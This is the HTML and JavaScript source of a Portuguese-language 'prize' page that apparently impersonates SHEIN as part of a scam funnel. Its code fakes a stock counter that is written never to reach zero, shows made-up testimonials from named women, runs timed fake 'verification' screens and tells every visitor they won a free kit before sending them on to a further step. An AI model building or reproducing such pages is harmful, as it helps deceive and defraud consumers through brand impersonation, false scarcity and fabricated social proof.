<meta charset="utf-8">

<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>SHEIN | Sua Premiação</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">

<script src="js/ugw7aeic2w.jsonp" async=""></script>
<script src="js/E-v1.js" async=""></script>
</head>
<body>
<div id="app-header"></div>
<main id="app" style="transition:opacity .15s ease"></main>
<div id="app-footer"></div>
<script>
(function(){
  mountChrome(62);
  var SM=StepManager('app');
  var IMG={makeup:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/ffvo3huuxccikfss50syf8i2?v=20260813a',clothes:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/bq80iyoglph7kofw7dabkww2?v=20260813a',home:'https://s3.atendimento-br.lat/typebot/public/workspaces/cmnpeeglq00017lz43hepps6y/typebots/cmnpnzz1n0004qxw5441zyxtx/blocks/e9z1k8dgcpzojm7ho3hxrl67?v=20260813a'};
  var PRIZES=[
    {key:'maquiagem',title:'Kit Maquiagem SHEIN',sub:'Sele\u00e7\u00e3o premium de maquiagens completas',value:'R$ 1.989,70',img:IMG.makeup,badge:'POPULAR'},
    {key:'roupas',title:'Kit Looks Tema Livre',sub:'Escolha as roupas que mais combinam com voc\u00ea',value:'R$ 1.992,00',img:IMG.clothes,badge:'TEMA LIVRE'},
    {key:'casa',title:'Kit Utens\u00edlios para Casa',sub:'Itens essenciais para o lar com tema livre',value:'R$ 2.043,00',img:IMG.home,badge:'MAIOR VALOR'}
  ];
  var TESTIMONIALS=[
    {name:'Ana Paula',city:'S\u00e3o Paulo, SP',initials:'AP',color:'#FF1A8C',text:'Recebi meu kit de maquiagem em menos de uma semana! Tudo original e muito mais do que eu esperava \uD83D\uDE0D Super recomendo!',timeAgo:'h\u00e1 2 dias'},
    {name:'Mariana Silva',city:'Belo Horizonte, MG',initials:'MS',color:'#7C3AED',text:'N\u00e3o acreditei quando chegou! O kit de roupas veio com pe\u00e7as lind\u00edssimas, todas no meu tamanho. A SHEIN \u00e9 incr\u00edvel! \u2764\uFE0F',timeAgo:'h\u00e1 3 dias'},
    {name:'Camila Oliveira',city:'Rio de Janeiro, RJ',initials:'CO',color:'#059669',text:'Gente, \u00e9 real!! Ganhei o kit casa e veio tudo certinho. Utens\u00edlios de qualidade demais. Obrigada SHEIN! \uD83C\uDFE0\u2728',timeAgo:'h\u00e1 1 dia'},
    {name:'Juliana Santos',city:'Curitiba, PR',initials:'JS',color:'#2563EB',text:'Participei sem acreditar muito e ganhei! J\u00e1 recebi em casa e amei cada pe\u00e7a do kit de maquiagem \uD83D\uDC84\uD83D\uDC95',timeAgo:'h\u00e1 5 dias'},
    {name:'Beatriz Costa',city:'Salvador, BA',initials:'BC',color:'#D97706',text:'Meninas, respondam o question\u00e1rio!! Vale muito a pena. Recebi meu kit de roupas ontem e estou apaixonada \uD83E\uDD70',timeAgo:'h\u00e1 4 dias'}
  ];
  function stars(n){var s='';for(var i=0;i<n;i++)s+='\u2B50';return s;}

  /* ============ ESTOQUE DIN\u00c2MICO (nunca zera) ============ */
  var STOCK={maquiagem:8,roupas:11,casa:6};
  var STOCK_MIN=2;
  function stockHtml(k){var n=STOCK[k];var urg=n<=3;
    return '<span style="width:7px;height:7px;border-radius:50%;background:'+(urg?'#dc2626':'#f59e0b')+';display:inline-block" class="heartbeat"></span>'
      +'<span class="text-xs font-bold" style="color:'+(urg?'#dc2626':'#b45309')+'">'+(urg?'\u00daltimas unidades! Apenas ':'Apenas ')+n+' kits restantes</span>';}
  function refreshStock(){Object.keys(STOCK).forEach(function(k){var el=document.getElementById('stock-'+k);if(el)el.innerHTML=stockHtml(k);});}
  setInterval(function(){
    var keys=Object.keys(STOCK).filter(function(k){return STOCK[k]>STOCK_MIN;});
    if(!keys.length)return;
    var k=keys[Math.floor(Math.random()*keys.length)];
    STOCK[k]--;refreshStock();
  },9000+Math.floor(Math.random()*7000));

  /* ============ PRIZE SELECTION ============ */
  SM.add('prize',function(){
    setProgress(62);
    return '<div class="step-enter wrap-2xl px-4 py-6">'
      +'<div class="text-center mb-6"><span class="pill" style="background:#dcfce7;color:#15803d">\u2713 QUESTION\u00C1RIO APROVADO</span>'
      +'<h2 class="text-2xl font-extrabold mt-4 mb-2">Escolha a sua premia\u00e7\u00e3o</h2>'
      +'<p class="text-gray-500">Selecione o kit que voc\u00ea deseja receber em casa:</p></div>'
      +'<div class="space-y-4">'+PRIZES.map(function(p){return '<button class="prize-card option-card w-full text-left bg-white border-2 border-gray-200 rounded-2xl overflow-hidden" data-key="'+p.key+'">'
          +'<div class="relative w-full bg-gray-100" style="aspect-ratio:16/9"><img src="'+p.img+'" alt="'+p.title+'" class="absolute inset-0 w-full h-full object-cover" onerror="this.style.display=\'none\'"><span class="absolute top-3 left-3 pill" style="background:#000;color:#fff;font-size:10px">'+p.badge+'</span></div>'
          +'<div class="p-4 flex items-center justify-between"><div><h3 class="font-extrabold text-lg">'+p.title+'</h3><p class="text-sm text-gray-500">'+p.sub+'</p><p class="text-sm font-bold mt-1" style="color:#be185d">Avaliado em '+p.value+'</p><div id="stock-'+p.key+'" class="flex items-center gap-1.5 mt-2">'+stockHtml(p.key)+'</div></div><span class="text-2xl">\u2192</span></div>'
        +'</button>';}).join('')+'</div>'
    +'</div>';
  },function(){
    document.querySelectorAll('.prize-card').forEach(function(b){b.onclick=function(){LS.set('funil_premio',b.getAttribute('data-key'));SM.go('stockcheck');};});
  });

  /* ============ VERIFICA\u00c7\u00c3O DE ESTOQUE ============ */
  SM.add('stockcheck',function(){
    setProgress(64);
    var pk=LS.get('funil_premio');
    var pr=PRIZES.filter(function(p){return p.key===pk;})[0]||PRIZES[0];
    return '<div class="step-enter wrap-md px-4 py-14 text-center">'
      +'<div id="sc-loading">'
        +'<div class="flex justify-center mb-6"><div class="spinner"></div></div>'
        +'<h2 class="text-xl font-extrabold mb-2">Verificando disponibilidade...</h2>'
        +'<p class="text-gray-500 mb-1">Consultando o estoque do <b>'+pr.title+'</b></p>'
        +'<p id="sc-status" class="text-sm text-gray-400">Conectando ao centro de distribui\u00e7\u00e3o...</p>'
      +'</div>'
      +'<div id="sc-ok" class="hidden">'
        +'<div class="flex justify-center mb-4"><span class="pill heartbeat" style="background:#dcfce7;color:#15803d">\u2705 KIT DISPON\u00cdVEL</span></div>'
        +'<h2 class="text-2xl font-extrabold mb-2">Boa not\u00edcia!</h2>'
        +'<p class="text-gray-600 mb-2">Ainda temos unidades do <b>'+pr.title+'</b> em estoque.</p>'
        +'<p class="text-sm mb-7" style="color:#b45309">\u26a0\ufe0f Uma unidade foi <b>reservada temporariamente</b> para voc\u00ea.</p>'
        +'<button id="sc-continue" class="btn-primary w-full rounded-xl py-4 text-base mb-3">Continuar com este kit \u2192</button>'
        +'<button id="sc-other" class="btn-outline w-full rounded-xl py-3 text-sm">Escolher outro kit</button>'
      +'</div>'
    +'</div>';
  },function(){
    var msgs=['Conectando ao centro de distribui\u00e7\u00e3o...','Verificando unidades dispon\u00edveis...','Confirmando reserva...'];
    var i=0;var st=document.getElementById('sc-status');
    var iv=setInterval(function(){i++;if(st&&msgs[i])st.textContent=msgs[i];},900);
    setTimeout(function(){
      clearInterval(iv);
      var l=document.getElementById('sc-loading'),ok=document.getElementById('sc-ok');
      if(l)l.classList.add('hidden');if(ok)ok.classList.remove('hidden');
    },2800);
    document.getElementById('sc-continue').onclick=function(){SM.go('social');};
    document.getElementById('sc-other').onclick=function(){SM.go('prize');};
  });

  /* ============ SOCIAL PROOF ============ */
  SM.add('social',function(){
    setProgress(66);
    return '<div class="step-enter wrap-2xl px-4 py-6">'
      +'<div class="text-center mb-5"><h2 class="text-2xl font-extrabold mb-2">Veja quem j\u00e1 recebeu</h2><p class="text-gray-500">Milhares de brasileiras j\u00e1 receberam suas premia\u00e7\u00f5es. Assista:</p></div>'
      +'<div class="vsl-box shadow-lg mb-3">'
        +'<div class="wistia_embed wistia_async_ugw7aeic2w videoFoam=false" data-utmify-ignore="true" style="position:absolute;top:0;left:0;width:100%;height:100%"> </div>'
      +'</div>'
      +'<div class="mb-6"><div class="h-1.5 w-full bg-gray-100 rounded-full overflow-hidden"><div id="spbar" class="h-full rounded-full" style="width:0%;background:#be185d;transition:width 1s linear"></div></div></div>'
      +'<button id="sp-cta" class="btn-primary w-full rounded-xl py-4 text-base opacity-40 mb-8" disabled>Aguarde o v\u00eddeo...</button>'
      +'<h3 class="text-center font-bold text-gray-700 mb-4">\u2B50 Mais de 12.000 avalia\u00e7\u00f5es 5 estrelas</h3>'
      +'<div class="space-y-3">'+TESTIMONIALS.map(function(t){return '<div class="bg-white border border-gray-100 rounded-xl p-4 shadow-sm flex gap-3"><div class="w-10 h-10 rounded-full flex items-center justify-center text-white font-bold flex-shrink-0" style="background:'+t.color+'">'+t.initials+'</div><div class="flex-1"><div class="flex items-center justify-between"><span class="font-bold text-sm">'+t.name+'</span><span class="text-[11px] text-gray-400">'+t.timeAgo+'</span></div><div class="text-xs text-gray-400 mb-1">'+t.city+' \u00b7 '+stars(5)+'</div><p class="text-sm text-gray-600">'+t.text+'</p></div></div>';}).join('')+'</div>'
    +'</div>';
  },function(){
    var cta=document.getElementById('sp-cta');
    unlockVideoBtn({barId:'spbar',ctaId:'sp-cta',seconds:60,label:'Continuar \u2192',extraCls:'mb-8'});
    cta.onclick=function(){if(!cta.disabled)SM.go('why');};
  });

  /* ============ WHY WANT (open text) ============ */
  SM.add('why',function(){
    setProgress(70);
    var pk=LS.get('funil_premio');
    var titles={maquiagem:'Por que voc\u00ea quer o Kit de Maquiagem?',roupas:'Por que voc\u00ea quer o Kit de Roupas?',casa:'Por que voc\u00ea quer o Kit para Casa?'};
    return '<div class="step-enter wrap-md px-4 py-8">'
      +'<span class="pill mb-4" style="background:#f3f4f6;color:#6b7280">QUASE L\u00C1</span>'
      +'<h2 class="text-2xl font-extrabold mt-3 mb-2">'+(titles[pk]||'Por que voc\u00ea quer esse pr\u00eamio?')+'</h2>'
      +'<p class="text-gray-500 mb-5">Conte para a SHEIN em poucas palavras (isso ajuda na sua avalia\u00e7\u00e3o):</p>'
      +'<textarea id="why-txt" class="input-field" rows="4" placeholder="Escreva aqui..."></textarea>'
      +'<button id="why-cta" class="btn-primary w-full rounded-xl py-4 text-base mt-5 opacity-40" disabled>Continuar</button>'
    +'</div>';
  },function(){
    var t=document.getElementById('why-txt'),cta=document.getElementById('why-cta');
    t.oninput=function(){var ok=t.value.trim().length>=3;cta.disabled=!ok;cta.className='btn-primary w-full rounded-xl py-4 text-base mt-5'+(ok?'':' opacity-40');};
    t.focus();
    cta.onclick=function(){if(!cta.disabled)SM.go('rating');};
  });

  /* ============ RATING ============ */
  SM.add('rating',function(){
    setProgress(72);
    return '<div class="step-enter wrap-md px-4 py-10 text-center">'
      +'<h2 class="text-2xl font-extrabold mb-2">Como voc\u00ea avalia a SHEIN?</h2>'
      +'<p class="text-gray-500 mb-7">D\u00ea uma nota de 0 a 5 para a sua experi\u00eancia:</p>'
      +'<div class="flex justify-center gap-2 mb-2" id="rate-row">'+[0,1,2,3,4,5].map(function(n){return '<button class="rate-btn w-12 h-12 rounded-full border-2 border-gray-200 font-bold text-gray-600 option-card" data-n="'+n+'">'+n+'</button>';}).join('')+'</div>'
      +'<p class="text-sm text-gray-400">0 = Ruim \u00b7 5 = Excelente</p>'
    +'</div>';
  },function(){
    document.querySelectorAll('.rate-btn').forEach(function(b){b.onclick=function(){
      LS.set('funil_rating',b.getAttribute('data-n'));
      document.querySelectorAll('.rate-btn').forEach(function(x){x.className='rate-btn w-12 h-12 rounded-full border-2 border-gray-200 font-bold text-gray-600 option-card';});
      b.className='rate-btn w-12 h-12 rounded-full border-2 border-black bg-black text-white font-bold option-card';
      setTimeout(function(){SM.go('verifying');},350);
    };});
  });

  /* ============ VERIFYING ANSWERS ============ */
  SM.add('verifying',function(){
    setProgress(74);
    return '<div class="step-enter wrap-md px-4 py-16 text-center">'
      +'<div class="flex justify-center mb-6"><div class="spinner"></div></div>'
      +'<h2 class="text-xl font-extrabold mb-2">Analisando suas respostas...</h2>'
      +'<p class="text-gray-500">Estamos calculando a sua premia\u00e7\u00e3o exclusiva.</p>'
    +'</div>';
  },function(){
    setTimeout(function(){SM.go('winner');},5000);
  });

  /* ============ WINNER ============ */
  SM.add('winner',function(){
    setProgress(76);
    var nome=LS.get('funil_nome').split(' ')[0];
    var pk=LS.get('funil_premio');
    var pr=PRIZES.filter(function(p){return p.key===pk;})[0]||PRIZES[0];
    return '<div class="step-enter wrap-md px-4 py-10 text-center">'
      +'<div class="flex justify-center mb-4"><span class="pill heartbeat" style="background:#dcfce7;color:#15803d">\uD83C\uDF89 VOC\u00CA GANHOU!</span></div>'
      +'<h2 class="text-3xl font-extrabold mb-3">Parab\u00e9ns, '+escHtml(nome)+'!</h2>'
      +'<p class="text-gray-600 mb-5">Voc\u00ea foi contemplada com o:</p>'
      +'<div class="bg-white border-2 border-pink-200 rounded-2xl overflow-hidden mb-5">'
        +'<div class="relative w-full bg-gray-100" style="aspect-ratio:16/9"><img src="'+pr.img+'" alt="'+pr.title+'" class="absolute inset-0 w-full h-full object-cover" onerror="this.style.display=\'none\'"></div>'
        +'<div class="p-4"><h3 class="font-extrabold text-xl">'+pr.title+'</h3><p class="text-sm text-gray-500 mb-2">'+pr.sub+'</p>'
        +'<div class="flex items-center justify-center gap-2"><span class="text-gray-400 line-through text-sm">'+pr.value+'</span><span class="text-2xl font-extrabold text-green-600">R$ 0,00</span></div>'
        +'<p class="text-xs text-green-600 font-semibold">100% GR\u00C1TIS para voc\u00ea</p></div>'
      +'</div>'
      +'<button id="w-cta" class="btn-primary w-full rounded-xl py-4 text-base">Resgatar meu pr\u00eamio \u2192</button>'
    +'</div>';
  },function(){
    fireConfetti(70);
    document.getElementById('w-cta').onclick=function(){__funilNav('/5/');};
  });

  SM.go('prize');
})();
</script>


</body></html>
